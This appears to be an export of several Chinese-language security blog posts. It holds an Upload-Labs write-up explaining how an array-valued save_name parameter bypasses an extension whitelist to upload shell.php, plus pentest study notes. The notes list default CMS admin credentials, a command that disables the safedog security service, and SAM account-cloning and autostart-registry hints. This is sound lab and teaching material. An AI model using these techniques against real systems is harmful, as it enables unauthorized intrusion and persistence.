array(\u0026#39;image/jpeg\u0026#39;,\u0026#39;image/png\u0026#39;,\u0026#39;image/gif\u0026#39;); if(!in_array($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;],$allow_type)){ echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } else { $file = empty($_POST[\u0026#39;save_name\u0026#39;]) ? $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;] : $_POST[\u0026#39;save_name\u0026#39;]; if (!is_array($file)) { $file = explode(\u0026#39;.\u0026#39;, strtolower($file)); } $ext = end($file); $allow_suffix = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); if (!in_array($ext, $allow_suffix)) { echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } else { $file_name = reset($file) . \u0026#39;.\u0026#39; . $file[count($file) - 1]; $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { echo \u0026#34;\u0026lt;script\u0026gt;error();\u0026lt;/script\u0026gt;\u0026#34;; } } } } ?\u0026gt; if (!empty($_POST[\u0026#39;submit\u0026#39;])) { $allow_type = array(\u0026#39;image/jpeg\u0026#39;,\u0026#39;image/png\u0026#39;,\u0026#39;image/gif\u0026#39;); if(!in_array($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;],$allow_type)){ echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } else { 这里就是检测你的文件类型，文件类型需要符合这个白名单才能进行下一步。绕过方法之前也用到过\n$file = empty($_POST[\u0026#39;save_name\u0026#39;]) ? $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;] : $_POST[\u0026#39;save_name\u0026#39;]; if (!is_array($file)) { $file = explode(\u0026#39;.\u0026#39;, strtolower($file)); } 这里就是获取上传文件名，如果参数save_name里面有值，就会把它的值赋给$file，可以发现在上传文件的时候save_name是可控的，这里就是这关的突破口。接下来是判断$file是不是数组类型，不是就会以.为分界创建数组。比如上传的是1.jpg经过这段语句就会变成array[\u0026quot;1\u0026quot;,\u0026quot;jpg\u0026quot;]\n$ext = end($file); $allow_suffix = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); if (!in_array($ext, $allow_suffix)) { echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; 取数组$file 的最后一位，也就是后缀名，进行判断查看是否在白名单之内\n} else { $file_name = reset($file) . \u0026#39;.\u0026#39; . $file[count($file) - 1]; $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { echo \u0026#34;\u0026lt;script\u0026gt;error();\u0026lt;/script\u0026gt;\u0026#34;; } 这里定义就是文件上传后的命名以及存储位置。比如$file=array['1','jpg'] ，上传后的文件名就是1.jpg\n接下来就是该如何通过这关，我们的突破口就在save_name中，我们传入save_name[0]=shell.php/ save_name[2]=png在检测后缀时，因为该数组最后一位是png所以可以绕过。在存储文件时我们存储文件名就会变成shell.php/.，因为用到了move_uploaded_file函数缺陷，我们仍然上传了shell.php。\n注 这里为什么要传save_name[2],因为$file[count($file) - 1] == $file[2-1]而我们$file[1]是一个空值。\n解决方法 ","date":"2024-05-06T22:39:37+08:00","image":"https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405052319298.jpg","permalink":"https://blog.winglet.com/p/upload-labs%E9%9D%B6%E5%9C%BA/","title":"Upload Labs靶场"},{"content":"前言 ​\t在我成功部署好我这个博客的时候，就发过一个爬虫代码的文章，并且说过以后写写爬虫基础的文章，那么如今就开始写相关的文章。说到爬虫，我去学习的原因只是因为当时面试实验室的时候（一个月后被实验室踢了，成自由人了），学长问了一句，当时我确实不会。后面就去学了一下，还爬了几个壁纸网站，但后面就没再深入学习了。但是在学习爬虫的过程中，得到的知识却在后面经常起到很大的作用，尤其是一年多后爬图书管理信息的时候，我又一次意识到它的作用，所以从现在开始我决定去深入学习一下爬虫。\n参考资料\n《python3网络爬虫开发实战》第二版 HTTP基础 爬虫是一直和web打招呼的，所以我们先从web基础知识讲起。\nURL和URI URI： 全称Uniform Resource Identifier（统一资源标志符）\nURL： 全称Uniform Resource Locator（统一资源定位符）\n例如http://github.com/favicon.ico这个既是URL也是URI，它的作用就是准确定位到favicon.ico文件的位置，我们要通过它去访问或获取这个文件，这个能准确访问指定文件的链接就是URL/URI。一条访问链接它需要包括了HTTP协议、访问路径(根目录)和资源名称。\nURL和URI的关系是包含关系，也就是说URL一定是URI, 但URI不一定是URL。因为URI中还包含URN。URN的作用只是为资源命名但不具有指定资源位置的功能，比如它可以指定一本书为urn:isbn:014235454,但它并没有指定我们去哪里去找到这个本书。它们的关系如下图\n但是URL也不是乱写的，它需要遵守一定的格式，基本组成格式如下：\nscheme://[username:password@]hostname[:port][/path][;parameters][?query][#fragment]\nscheme: 协议。常用的协议有http、https、ftp username,password: 账号密码。这个比较少见，某些情况下需要账号和密码才能访问URL。https://admin:admin@ssr3.scrape.center hostname: 主机地址。可以是域名或是IP。ww.baidu.com port: 端口号。我们访问网页时默认时80或8080端口，有时要访问特定网页时需要加上端口。http://localhost:1313 path: 路径。网络资源在服务器中的指定地址。https://github.com/favicon.ico中favicon就是path parameters: 参数。访问网络资源的附加信息，很少见现在都以?query作为参数。https://8.8.8.8:12345/hello;user query: 查询。用来查询某类资源，有多个查询时用\u0026amp;隔开。http://localhost:8080/1.php?s=wwww fragment: 片段。对资源描述的描述补充。通常是作为路由管理或者翻页下滑滚动到特定位置。 HTTP和HTTPS HTTP： 全称是Hypertext Transfer Protocol，即超文本传输协议，作用是把超文本数据从网络传输到本地浏览器，能够确保高效而准确地传输超文本文档。目前常用的是HTTP 1.1版本， 不过目前也有不少网站有使用HTTP 2.0版本趋势。\nHTTPS: ** 全称是Hypertext Transfer Protocol over Secure Socket Layer，说白了就是HTTP的安全版本。它的安全基础是SSL**,因此通过该协议的数据都必须经过SSL的加密。\nSSL的作用：1. 建立一个信息安全通道，确保数据传输的安全性。 2. 确认网络的真实性。现在用HTTPS协议的网站，都可以查询到它的认证真实信息，并且都有ca机构办法的安全签章。 现在很多网站用的都是HTTPS协议，毕竟一个有安全保障，一个无安全保障，都知道应该选择哪个。HTTP经常会在我们建立本地网站的时候使用。\nHTTP和HTTPS协议都属于计算机网络中的应用层协议，其下层是基于TCP协议实现的。而TCP协议属于计算机网络的传输层协议，它建立了连接时的三次握手和四次挥手。 HTTP请求过程 我们通常通过在浏览器的地址栏上输入URL，就成功访问到了指定网页。但其实是浏览器先将我们的URL请求发送给对应的服务器，然后服务器接受请求并进行处理和解析后，返回给对应的响应，接着传回给浏览器。由于响应包中包含着页面的源代码，浏览器便将它们解析执行，并最终将网页呈现出来。\n为了更好理解我们使用chrome浏览器，并访问www.baidu.com。访问成功后，按下F12然后看network（网络）面板\n可以看见network面板下有很多条目，每一个条目就代表着进行了一次请求和响应。我们先看看www.baidu.com条目\n名称: 请求的名称。一般会以URL的最后部分作为名称 状态: 状态码 类型: 请求文档的类型 启动器: 请求源。标记请求是由哪个对象或进程发起的 大小: 从服务器请求的资源大小。 时间: 从发起请求到获得响应花的时间。 瀑布: 网络请求的可视化瀑布流。 接下来单击这个条目，看看跟详细的内容。\n这里分有常规、响应标头、请求标头这三个类型。\n请求 请求方法 我们常见的请求方法就是GET和POST这两种请求方法。GET方法的格式就是 www.baidu.com/?wd=ddd 这个URL包含了query信息，通常用于我们查询某些数据或提交某些信息。POST请求方法是提交一个表单，这个方法通常是我们提交登录信息的时候使用。\n它们的区分有以下特点：\nGET方法提交的数据我们可以直接在URL上看见，POST方法提交的数据我们看不见，只能使用一些抓包软件才能看见其内容 GET方法提交的数据有大小限制为1024字节，POST提交的数据没有大小限制。 当然除了这两种请求方法还有其他的。\n方法 描述 GET 请求页面，并返回页面内容 POST 大多用于提交表单或者上传文件，数据包含在请求体中。 PUT 用客户端传向服务器的数据取代指定文档中的内容 HEAD 类似GET请求方法，不过返回的响应种没有具体内容。用于获取报头 DELETE 请求服务器删除指定的页面 CONNECT 把服务器当作跳板，让服务器代替客户端访问其他页面 OPTIONS 允许客户端查看服务器的性能 TRACE 回显服务器收到的请求。主要用于诊断或测试 请求的网址 请求的网址，它可以确定唯一的客户端想请求的资源。其实就是URL\n请求头 请求头，用来说明服务器的附加信息，其中有几个很重要。\nAccept: 请求报头域，用于指定客户端可接受哪些类型的信息 Accept-Language: 用于指定客户端可接受的语言类型 Accept-Encoding: 用于指定客户端可接受的内容编码 Host: 用于指定请求资源的主机IP和端口号。其内容为请求URL的原始服务器或网关的位置 Cookie: 网站用于辨识用户，进行会话跟踪而存储在用户本地的数据。主要功能是维持当前访问会话。 Referer: 用于标识请求时从哪个页面发送过来的 User-Agent: 可以使服务器识别客户端使用的操作系统及版本，浏览器及版本等信息。写爬虫时用上这个可以伪装成浏览器 Content-Type: 互联网媒体类型或者MIME类型，在HTTP协议消息头中用来表示具体请求中的媒体类型信息。 请求体 请求体一般都是POST请求中表单的内容。对于GET请求则没有请求体。而在我们进行提交POST请求时，需要注意把请求头的Content-Type设为application/x-www-from-urlencode。只有这样内容才能以表单数据的形式进行提交。也可以将Content-Type设置为application/json来提交JSON数据。其他Content-Type类型与POST的关系如下表。\nContent-Type POST提交数据的方式 application/x-www-from-urlencode 表单数据 multipart/from-data 表单文件上传 application/json 序列化 JSON 数据 text/xml XML数据 响应 Response，由服务器返回给客户端。响应可以分为三部分：响应状态码、响应头、响应体\n响应状态码 表示服务器的响应状态。暂时不详细列举，记住几个主要的就行。200表示服务器处理请求成功。302表示请求的网页跳转到其他网页。\n响应头 包含了服务器对请求的应答信息。\nDate: 用于标识响应产生的时间 Last-Modified: 用于指定资源的最后修改时间 Content-Enocoding: 用于指定响应内容的编码 Server: 包含服务器的信息，如名称、版本号等 Content-Type: 文档类型，指定返回的数据是什么类型 Set-Cookie: 设置Cookie。用于告诉浏览器需要将此内容放到Cookie中 Expires: 用于指定响应的过期时间，可以让代理服务器或浏览器将加载的内容更新到缓存中。可以使下次访问的时候直接使用缓存中的内容 响应体 最为关键的部分，我们看到的网页它的源代码其实就在响应体中。而我们写爬虫时就是要爬取这部分的内容。这部分可以通过鼠标右键-查看源代码进行查看。\nweb网页基础 网页的组成 一个web网页基本是由HTML、javascript、css这三大部分组成。如果我们把网页比作人，那么HTML就是骨架，javascript就是肌肉，css就是皮肤。\nHTML 超文本标记语言。一种用来描述网页的语言。\n这部分就是HTML语言，它包含了一系列的标签，同时这些标签也起着不同的作用。\njavascript 简称JS，是一种脚本语言。可以与HTML和CSS组合使用，它能给用户提供一种静态信息缺乏交互性。我们在下载或加载时出现的加载符号就是由JS实现的。\ncss 由HTML语言写出来的只是网页的框架，所以看起来就并不美观，所以CSS就是起到网页美化的作用。\n节点树及节点间的关系 在HTML中，所有标签定义的内容都是节点，而这些节点构成一个HTML节点树，也就叫HTML DOM树。它们是有标准的。\n1.整个网站文档是一个文档节点 2.每个HTML标签对应一个根节点，比如html标签，他就属于一个根节点 \u0026lt;html\u0026gt; 3.节点内的文本是文本节点，如a节点代表一个超链接，它内部的文本也被认为是一个文本节点 \u0026lt;a\u0026gt; 4.每个节点的属性是属性节点，比如a节点中有一个href标签，这就是一个属性节点 \u0026lt;a href=\u0026gt; 5.注释是注释节点，在HTML中有特殊的语法会被解析为注释，他也会对应一个节点 下图就是html语言的节点树\njavascript语言可以嵌套在任意节点中。\n节点树之间也用有层级关系，其关系如右图\n选择器 这部分是css的一些语法和格式，暂时不讲那么多。\n爬虫的原理 讲了那么多网络知识，现在终于要讲讲爬虫是什么了。如果我们把互联网比作一张蜘蛛网，那么爬虫就是要在这张蜘蛛网上爬行，它每爬到一个节点就是访问了一个页面，一直爬到末端才是找到了想要的资源。我们就是要通过爬虫访问页面然后获取我们想要的信息。\n爬虫概述 简单而言就是获取网页并提取和保存信息的自动化程序。\n获取网页 爬虫的首要目的就是获取网页的源代码，这个源代码就是服务器接受请求后发送过来的响应体。所以关键的点就是要模拟客户端向服务器发送请求，然后让服务器把源代码发过来。这里我们可以通过利用python的urllib、requests等模块来实现。\nimport requests url = \u0026#34;https://www.baidu.com\u0026#34; resp = requests.get(url) print(resp.text) 运行上面的代码,我们就能获取服务器发送过来的响应体，也就是网页的源代码\n提取信息 当我们获取了网页源代码后，要做的就是找到需要的数据。在提取信息时通常用的方法是用正则表达式，这需要构造好正则表达式，这是一个复杂且容易出错的过程，但只要构造完成就能实现信息的精准提取。\n保存数据 提取到的的数据很多的时候就需要保存起来，可以把数据以表单的形式保存到数据库，excle等里面，这样在便于以后更好的利用这些数据。\n自动化程序 在爬取数据的时候常常是要在不同的网页上，如果我们一个网页一个网页的获取源代码然后再在里面找会耗费很多时间。这就需要自己去设计程序，让它能够自动化进行以上操作。\n能爬怎样的数据 网页中存在着各种各样的数据，最为常见的就是网页的html代码，有时也会有json格式的数据，还有一些二进制文件、图片等。这些都是我们可以爬取的数据，只是它们的储存方式会有不同，这在之后爬取相关数据时再详细说明。简单来说只要浏览器能够访问到的数据，我们都可以爬取。\njavascript渲染的页面 在使用requests等模块抓取网页源代码，可能会遇到抓取的源代码和网页源代码不同的情况。这是一个常见的问题，现在很多网页采用的是Ajax前端工业化模块，所以它的网页可能是由javascript代码渲染出来的。\n我们在使用requests模块抓取网页的时候只能得到html代码，所以如果该网页是由javascript渲染出来的，我们是抓取不到js代码的，他也不会去加载js代码，这就导致无法抓取完整的源代码。\n不过也有解决办法，可以直接分析源代码后台Ajax接口，或者使用selenium、Splash、Pyppeteer、Playweight等模块来模拟javascript的渲染。\nSession和Cookie session和cookie之间的区别可以说是很常见的问题了。我们上网的时候也常常用到他们，通常一个需要登录的网站，我们登录之后就可以访问到其他页面。有的网站在登录一次之后，一段时间内再次访问就可以免登录直接访问，等等情况都是cookie和session共同实现的。那么接下来就要解开它们的面纱。\n静态网页和动态网页 静态网页的网页内容是由HTML代码编写的，它里面的各种内容、图片均是由已经写好的HTML代码指定的。静态网页优点就是加载快、编写简单。但问题也显而易见，如可维护性差，不能根据url的变化灵活改变网页内容。也就是说我们如果在通过url传一个name参数，网页时无法将其展示出来的。\n动态网页便可以解决以上问题，它可以根据url的变化，关联数据库对网页进行不同的展示。可以说如今很多网站都是动态网站，它们不再仅仅使用HTML代码还会用php，java等代码编写。动态网页也可以实现网页的登录和注册等功能。\n谈到登录功能，我们在输入并提交正确的账号和密码后，肯定使获得了服务器发送过来的某种凭证才能去访问其他页面，就像你进入大学得到学生卡一样。而这种凭证就是cookie和session共同实现的结果。\n无状态HTTP 这里还要了解一个HTTP特点，就是无状态。HTTP的无状态就是HTTP协议对于事物的处理是没有记忆的，或者说服务器它并不知道客户端当前处于一个什么状态。举个例子就是你成功登录后只能访问了当前页面，如果想要访问其他页面还要继续登录，即使登录信息是一致的。这就是服务器无法判断你当前状态导致的结果。因为服务器只是做到给客户端发送响应包这个过程，而这个过程是完全独立的。所以服务器是不会记录浏览器前后的状态变化也就是没有状态记录。这就导致客户端可能要发送重复的数据包。\n为了保持HTTP连接状态，session和cookie技术就出现了。session在服务端，用于保存用户的session信息；而cookie则在客户端，有了cookie在下次访问网页的时候，客户端就会把cookie里面的内容一起发送给服务器，而服务器就可以通过识别cookie里面的内容来判断用户信息，然后判断用户的登录状态情况，并发送对应的响应包。\n简单理解就是，cookie中保存着用户的凭证信息，下次访问网站时，客户端在发送请求包时就会把它捎带上一起发给服务器。\n所以在爬取需要登录的网页时，需要先登录进去，然后有了cookie才能继续爬取其他网页。\nSession 中文称为会话，其本义就是有始有终的一系列动作，就像打电话一样，从接起电话开始这个行为会一直持续到挂断电话结束。\n在web中，session对象用来存储特定用户的session所需的属性即配置信息。这样用户在应用程序不同页面之间跳转的时，session对象里的变量将不会丢失，会在整个用户session中保存。如果该用户没有session，那么web服务器就会自动创建一个session对象。只有当session过期或被放弃的时候，服务器才会终止该session。\nCookie 指的是网站为了鉴定用户身份，进行session跟踪而存储在用户本地终端上的数据。\nsession维持 我们知道session是保存在服务器的，那么我们要如何访问其他页面的时候去找session核对信息呢。在我们第一次发送登录信息给服务器的时候，服务器返回的响应头中会带有Set-Cookie字段的相应给客户端，这个字段就是用来标记用户的，所以客户端会把cookie保存起来，并在下次向相同网站发送请求时会将cookie带上一起发个服务器，服务器就会识别cookie中携带的Seesion ID信息，并在session对象中查找是否有对应的session并判断session的用户状态。如果这个session是有效的，就说明用户处于登录状态，这时服务器就会发送带有网页源代码的响应包给客户端。\n那反过来说，如果cookie无效或者session过期了，那就要重新登录了。cookie和session相互配合就能实现登录控制。不过它们也可以独立使用。\n属性结构 我们可以通过开发者工具查看cookie\n接下来讲解cookie里面的属性\nName: Cookie的名称。创建后不可更改 Value: Cookie的值。 Domain: 指定可以访问该Cookie的域名。 Path: Cookie的使用路径。 Max-Age: Cookie失效的时间，单位为秒。 Size字段: Cookie的大小。 HTTP字段: Cookie的httponly属性。 Secure: 是否仅允许使用安全协议传输Cookie。 会话Cookie和持久Cookie 会话Cookie就是把Cookie放在浏览器内存里，关闭浏览器后，Cookie即失效；持久Cookie会把Cookie保存在客户端的硬盘里，下次可以继续使用。\n其实说白了，它们都是由Max-Age或Expires字段来决定其失效时间。\n常见误区 大部分人会认为浏览器关闭了，session也就消失了，但这种想法是错误的。在浏览器关闭的时候，服务器是不会立即知道浏览器关闭的，服务器只会通过它们之间的tcp连接状态等信息，判断浏览器是否断开，可以说服务器是不可能直接知道浏览器是否关闭的。 而session是由服务器创建且存在其中的，浏览器关闭只是会让session会话过期或者终端，但是并不代表它被删除了，就像是你去超市办会员卡，你随时可以过来用，并不是说你今天出了超市这张卡就没用了，它们会一直记录你的会员信息，只有当你自己去注销了，你的会员信息才会被删除。session也是这样的。\n代理的基本原理 我们在爬虫是通常会遇到一种状况，就是正在爬的时候，出现403错误。之前用爬取豆瓣图书信息的爬虫代码就出现多次403。这是因为网站会采取一些反爬措施，比如它发现某一ip在单位时间内频繁访问网页，而在超过访问次数阈值的时候，就会直接拒绝提供服务并提供错误信息，这种情况一般而言就是被封IP了。\n基本原理 代理指的就是代理服务器，代网络用户取得网络信息。说白了就是信息中转站，本来我们与服务器是两点一线的，有了代理服务器，我们就会先把请求发给代理服务器，然后由代理服务器发送给目的服务器，而目的服务器也要先发给代理服务器，然后由代理服务器发给我们。\n代理的作用 突破自身IP限制，简单来说就是可以上外网 访问一些单位或团体的内部资源。 提高访问速度 隐藏真实IP。你也不想被别人溯源吧 爬虫代理 爬虫速度不够快能叫爬虫吗，为了避免同一IP多次访问而被ban，就需要使用其他IP代理。\n代理分类 根据协议分类 FTP代理服务器：主要访问FTP服务器，一般有上传、下载及缓存等功能，端口21、2121等 HTTP代理服务器：主要访问网页，一般有内容过滤和缓存功能，端口80、8080、3128等 SSL/TLS代理：主要访问加密网页，一般有SSl、TLS加密功能，端口443 RTSP代理：主要用于Realplayer访问Real流媒体服务器，一般有缓存功能，端口554 Telnet代理：主要用于Telnet远程控制，端口23 POP3/SMTP代理：主要用于POP3/SMTP方式发邮件，一般有缓存功能，端口110/25 SOCK3代理：单纯传递数据包，速度快不关心协议和用法，一般有缓存功能，端口1080 根据匿名程度区分 高度匿名代理：将数据包原封不动的发给服务器，服务器基本上会认为其就是一个正真的客户端。 普通匿名代理：对数据包有一些修改，服务器容易判断这是来自一个代理服务器 透明代理：会告诉服务器真实IP，提高浏览速度。 间谍代理：会记录用户传输的数据，并进行记录，监控，分析等 常见代理设置 网上有些免费代理 有些付费代理 ADSL拨号 蜂窝代理 后面慢慢介绍\n多线程和多进程的基本原理 简单来说，为了提高爬虫效率，我们可能会同时运行多个爬虫任务，而其中涉及多线程和多进程的概念。\n多线程的含义 进程可以理解为一个可以独立运行的而程序单位。比如我们打开了一个浏览器，就可以称之为打开了一个浏览器进程；打开了LOL，就是打开了LOL进程。而我们可以在浏览器里做很多事，比如我们一个页面看视频，一个网页看小说，每打开一个网页就可以说是一个线程。并且它们互不干扰，我们可以同时看视频和看小说。\n进程就是线程的集合，是由一个个线程组成的，线程是操作系统进行运算调度的最小单位，也是进程中的最小运行单位。\n并发和并行 并发指的是多个线程对应的多条指令被快速轮换执行。举个例子就是现在有很多线程，我们线程A执行一段时间，然后线程2执行一段时间，就这样轮番执行，但每次只执行一个线程指令，因为之间的时间很短，所以我们也可以认为它们是一起执行的，但本质上还是因为速度足够快才使它们没有强烈的分离感。\n并行这个才是正真的同时进行，在同一时刻有多条指令在多个处理器上同时执行，但这也意味着必须依赖多个处理器。\n如果计算机处理器只有一个核，那就不能实现并行。\n多线程适用场景 可以说爬虫就是一个典型的利用场景，爬虫在向服务器发送请求后，需要一段时间等待服务器返回响应，这种就属于IO密集型任务。\n对于这种任务，我们就可以启用多线程，在等待的时间去处理其他线程任务。\n除了IO密集型任务这个概念，还有一种叫计算密集型任务，就是任务的运行一直需要处理器的参与\n多进程含义 多进程就是多个进程，我们已经知道了进程就是线程的集合，所以多进程意味着有大于或等于进程数量的线程在同时运行。\nPython中的多线程和多进程 在python中进行多线程的话会有GIL限制。全程是Global Interpreter Lock,即全局解释器。\n在python中每个线程执行分以下三步进行：\n获取GIL 执行对应线程的代码 释放GIL 所以GIL就像通行证一样，拿到通行证了这个线程才能执行，但是python中只有一个GIL，所以只能进行并发操作。而受GIL的影响，python在进行多进程要比多线程有更多优势。\n想了解更多python中多进程和多线程的知识，可以通过以下网站学习\npython的多线程用法：https://setup.scrape.center/python-threading python的多进程用法：https://setup.scrape.center/python-multiprocessing ","date":"2024-02-02T17:46:38+08:00","image":"https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/13.png","permalink":"https://blog.winglet.com/p/web%E5%9F%BA%E7%A1%80/","title":"Web基础"},{"content":"前言 决定写这么一个分类，主要是记录一下我平时在做些东西时遇到的各种奇奇怪怪的问题，以及我是怎么用莫名方法解决的。然后以后我再遇到同样问题的时候也可能有办法解决。\n部署aspcms之数据库错误解决方法 解决方法 可能不适用所有人\n找到mysql目录,位置在C:\\Program Files\\MySQL，然后右键MySQL选择属性，修改用户权限\n具体修改哪个不清楚，反正你开个虚拟机然后赋予所有用户所有权限就行。\nwindows 10 家庭版没有hyper-V服务 新建一个记事本\npushd \u0026#34;%~dp0\u0026#34; dir /b %SystemRoot%\\servicing\\Packages\\*Hyper-V*.mum \u0026gt;hyper-v.txt for /f %%i in (\u0026#39;findstr /i . hyper-v.txt 2^\u0026gt;nul\u0026#39;) do dism /online /norestart /add-package:\u0026#34;%SystemRoot%\\servicing\\Packages\\%%i\u0026#34; del hyper-v.txt Dism /online /enable-feature /featurename:Microsoft-Hyper-V-All /LimitAccess /ALL 改为1.cmd, 右键并以管理员身份运行\n","date":"2024-01-22T17:45:52+08:00","image":"https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/640.png","permalink":"https://blog.winglet.com/p/%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/","title":"疑难杂症"},{"content":"一、渗透基础知识 渗透测试介绍 渗透测试或渗透测试是一种道德驱动的尝试，旨在测试和分析安全防御以保护这些资产和信息。渗透测试涉及使用与恶意意图相同的工具、技术和方法，并且类似于审计。\n渗透测试注意事项（补充） 不能进行恶意攻击 没有获得书面授权时，不能攻击任何目标 遵守国家安全法法规 渗透测试流程 确定目标，信息收集 漏洞探测，漏洞验证 获取所需，信息分析 编写报告，信息整理 安全术语（了解） 脚本 (asp、php、jsp) html (xml、js、css) cms (B/S) 肉鸡、抓鸡、ddos、cc 事件型漏洞、通用型漏洞 web服务器、web容器、中间件 src平台、0day 黑盒白盒测试 嗅探、rookit、社工 poc、expcve 一句话、小马、大马、webshell、提权、后门、跳板、rookit MD5/加盐 (salt) 源码打包、脱库、爆库 HTTP/HTTPS协议 HTTP: 是互联网上应用最为广泛的一种网络协议，是一个客户端和服务端请求和应答的标准(TCP)，用于从www服务器传输超文本到本地浏览器的传输协议。它可以使浏览器更加高效，使网络传输减少。默认端口:80 HTTPS：是以安全为目标的HTTP通道，简单来说就是HTTP的安全版，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。HTTP + 加密 + 认证 + 完整性保护 = HTTPS。默认端口:443 HTTP URL 统一资源定位符(URL时一种特殊类型的URI，包含了用于查找某个资源足够的信息)\n格式： http://host[: port][abs_path]\n例：http://localhost:1313/index.php\nhttp请求头响应头 referer、x-forwarded-for、client-ip 注入漏洞、xss问题、躲避验证\n对ip限制封锁\nhttp: bp\ntcp：modify client-ip\niis put漏洞(严重)\njsp、tomcat 7.0.1-7\nHTTP响应码 200：请求成功 302：所请求的页面已经临时转移至新的URL 404：服务器无法找到被请求的页面 400：因为语法错误，服务器未能理解请求 401：合法请求，但对被请求页面的访问被禁止。因为被请求的页面需要身份验证，客户端没有提供或者身份验证失败 403：合法请求，但对被请求页面的访问被禁止 500：请求未完成。服务器遇到不可预知的情况 503：服务器当前不可用 waf拦截菜刀也可能导致50x 安全测试环境配置 配置虚拟机 安装wmware 配置虚拟机网络 nat模式：自动获取ip，以物理机为路由器 桥接模式：自动获取，以物理机的路由器为路由器 虚拟机通信：\n网卡一致 ip网段一致 如果不通可以关闭防火墙 kali: 192.168.114.129 win10: 192.168.114.145 修改虚拟机网段 **ps:**windows系统可以通过win+R并输入uac来修改用户控制系统\n搭建windows server 下载地址： MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn)\n操作系统： windows server 2012\n搭建网站(.asp) 当服务器搭建多个站（旁站）\n不同端口，ip域名都相同 （端口模式） 相同端口（80）IP不同，也可以 相同端口，相同ip，不同域名 (子域名模式) www.baidu.com\tphp程序 baidu.baidu.com\tasp程序 目录建站 (目录模式) www.baidu.com www.baidu.com/list 创建角色和功能 前面默认选择，在“服务器角色”这里选择如下\n接下来，由于要搭建动态语言脚本，所以在\u0026quot;角色服务\u0026quot;里选择如下（里面的子选项一定也是选中状态）\n接下来就是等待安装\n部署网站 win+R并输入inetmgr打开IIS控制台\n然后我们新建一个网站目录\n**ps：**这里也可以通过自己添加ip来绑定其他更多ip\n接下来我们只需要把一个网站源码放到该目录，然后进行以下修改\n接下来我们就可以直接访问网站，ip:80。如果还是无法访问的话，在默认文档中添加源码的展示文件\n绑定域名 但是如果我们去访问www.baidu.com的话，它会转到百度的页面，这里我们需要修改系统的host解析(优先级高于dns解析)，位置在C:\\Windows\\System32\\Drivers\\etc\\host,并在结尾出添加\n192.168.114.138 www.baidu.com 判断网站是不是基于IIS搭建 用搜索引擎语法inurl=asp?id=\n搭建网站(.php) 下载phpstudy,选择这个版本\n接下来我们在windows 10系统搭建一下。下载后解压并运行程序可得到该界面\n配置系统（处理中） 接下来我们要配置系统，如果你发现windows 10系统没有IIS服务，可以在控制面板-\u0026gt;程序-\u0026gt;启用或关闭windows功能\n接下来我们还要打开FastCgi模块\n课后作业 .asp cms 默认索引文件 后台登陆地址 默认账号/密码 aspcms index.asp http://IP/admin_aspcms/login.asp admin/123456 southdic (南方) Default.asp http://IP/admin/Login.asp admin/0791idc .php cms 默认索引文件 后台登陆地址 默认账号/密码 xdcms index.php http://IP/index.php?m=xdcms\u0026amp;c=login xdcms/xdcms 帝国cms index.php http://IP/e/admin/index.php admin/admin888 dedecms（织梦） index.php http://IP/dede/login.php?gotopage=%2Fdedecms%2Fdede%2F admin/admin phpweb index.php http://IP/root admin/admin 二、windows基础 系统目录 windows -- system32 储存常用命令(如：cmd) | -- config -- sam 存储账号密码(清空可直接登录) 有system32(x86)说明一定64位系统 services.msc打开服务 定义计算机默认功能的开启 DHCP自动分发ip net stop/start [服务名称] 驱动和程序 sc config \u0026quot;safedog center guarder\u0026quot; start=disable 将该服务设为禁用，重启服务后相当于关闭 计算机端口 端口就是用来区分服务的 端口不可复用 (在渗透时，可以尝试将3389端口与80端口进行复用，从而访问80端口时获得远程桌面权限) 端口范围1-65535 1-1024 分给了系统自带的一些服务 木马病毒一般使用高位端口 ps：http隧道技术，端口转发\n常见端口及服务（补充） 注册表及其结构(补充) 打开注册表win+R regedit\nHKEY_CLASSES_ROOT: 文件扩展名与应用的关联及OLE信息 HKEY_CURRENT_USER: 当前用户控制面板选项和桌面等设置，以及映射的网络驱动器 HKEY_LOCAL_MACHINE: 计算机硬件与应用程序信息 HKEY_USERS: 所有登录用户的信息 HKEY_CURRENT_CONFIG: 计算机硬件配置信息 克隆账号HKEY_LOCAL_MACHINE/SAM可以把管理员权限赋予来宾账号 (如何操作) 开机启动项注册表\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 或\\HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\ 常用DOS命令 color: 这个命令用于改变命令提示符窗口的前景色和背景色。 ping: 用于测试与特定网络地址之间的连接。它发送一个网络数据包到目标地址，并等待接收响应，从而评估网络的可达性和延迟。 ipconfig: 命令用于显示计算机的网络配置信息，包括IP地址、子网掩码、默认网关和DNS服务器等。 ipconfig /release: 这个命令用于释放计算机当前使用的IP地址，这样计算机就可以申请新的IP地址。 ipconfig /renew: 这个命令用于向网络中的DHCP服务器请求更新IP地址，以获得一个新的IP地址配置。 systeminfo: systeminfo命令用于显示计算机的详细系统信息，包括操作系统版本、安装的补丁程序、硬件配置和网络信息等。 arp -a: 